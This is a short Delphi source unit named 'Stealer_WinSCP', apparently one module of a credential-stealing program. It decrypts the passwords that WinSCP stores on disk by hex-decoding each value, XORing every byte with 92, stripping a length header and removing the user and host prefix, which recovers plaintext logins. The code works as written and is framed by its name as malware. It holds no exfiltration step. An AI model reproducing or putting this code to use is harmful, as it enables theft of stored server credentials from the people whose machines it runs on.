unit Stealer_WinSCP;

interface

uses
  Sysutils,Windows;

function WinSCPDecrypt(const Host,User,Value:ansistring): ansistring;

implementation

    function HexStrToByteStr(const Value: ansistring): ansistring;
    var
      i: Integer;
    begin
      Result := '';
      for i := 1 to Length(Value) div 2 do begin
        try
          Result := Result + AnsiChar(StrToInt('$' + Copy(Value, i*2-1, 2)));
        except
          Result := '';
          Exit;
        end;
      end;
    end;

function WinSCPDecrypt(const Host,User,Value:ansistring): ansistring;
var
  BSkip, BLen: LongWord;
  i: Integer;
begin
  Result := HexStrToByteStr(Value);
  if Length(Result) <= 4 then begin
    Result := '';
    Exit;
  end;

  for i := 1 to Length(Result) do
    Result[i] := AnsiChar(Ord(Result[i]) xor 92);

  BLen := Ord(Result[3]);
  BSkip := Ord(Result[4]);
  Delete(Result, 1, 4);
  Delete(Result, 1, BSkip);
  Result := System.Copy(Result, 1, BLen);

  if Result = '' then Exit;

  BLen := Length(User)+Length(Host);
  if System.Copy(Result, 1, BLen) <> User+Host then begin
    Result := '';
    Exit;
  end else
    Delete(Result, 1, BLen);
end;

end.
